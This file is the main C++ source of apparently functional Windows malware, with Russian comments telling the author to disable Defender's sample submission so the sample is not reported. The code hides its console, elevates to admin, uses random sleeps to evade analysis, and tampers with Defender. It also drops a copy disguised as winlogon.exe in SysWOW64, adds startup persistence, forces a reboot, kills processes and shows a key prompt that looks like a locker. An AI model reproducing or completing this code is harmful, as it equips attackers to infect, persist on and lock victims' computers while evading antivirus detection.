#include "func.h"
#include "include.h"
#include "threads.h"
using namespace std;
// g++ main.cpp -static -static-libgcc -static-libstdc++ -lgdi32 -o my_program.exe

// main execution of code parts depends on location and other conditions on the infected device
// 3213
// !!ВАЖНО!!
// ЕСЛИ У ТЕБЯ WINDOWS
// КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ НА ТВОЕМ ПК И НА ВИРТУАЛКЕ
// ЧТОБЫ ОТКЛЮЧИТЬ ОТПРАВКУ: Защита от вирусов и угроз - параметры защиты от вирусов и других угроз - управление настройками - автоотправка образцов отключить
int main(int argc, char* argv[]) {
    HWND Console;
    Console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Console, 0);
    char path[MAX_PATH];
    if (!isUserAdmin()) {
        restartAsAdmin();
        return 0;
    }
    Sleep(rand() % 5000 + 5000);
    if (copyAndRunSelf()) {
        return 0;
    }
    if (!checkAndCreateFile("lafkildatnn.dat")) {
        DefenderOwner(); // возможно както переработать ?
        system("powershell -Command \"Copy-Item -Path 'C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\test.exe' -Destination 'C:\\Windows\\SysWOW64\\winlogon.exe' -Force\"");
        addToStartup();
        Sleep(1500);
        reset();
        Sleep(rand() % 5000 + 5000);
        restartSystem();
        return 0;
    }
    std::thread killerThread(StopAllShit); // Запускаем фоновый поток
    killerThread.detach();
    Sleep(rand() % 5000 + 5000);
    MessageBox(NULL, "Your crypt here!", "CrashHandler", MB_ICONERROR | MB_OK);;
    // тут основной процесс закрепления 
    ShowWindow(Console, 1);
    int key = 123;
    int inkey;
    while (key != inkey) {
        cout << "Enter key: ";
        cin >> inkey;
    }
    cleanfile();
    cleanreg();
    reset();
    return 0;
}